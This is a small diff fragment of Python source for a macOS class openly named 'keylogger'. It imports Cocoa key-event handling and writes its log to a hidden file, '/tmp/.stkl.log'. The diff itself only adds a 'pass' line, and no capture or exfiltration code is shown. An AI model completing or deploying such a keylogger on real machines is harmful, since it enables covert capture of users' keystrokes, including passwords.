@@ -9,6 +9,7 @@ from Cocoa import NSEvent, NSKeyDownMask
 from PyObjCTools import AppHelper
 
 class keylogger():
+    pass
 
     def __init__(self):
         self.log_file = '/tmp/.stkl.log'
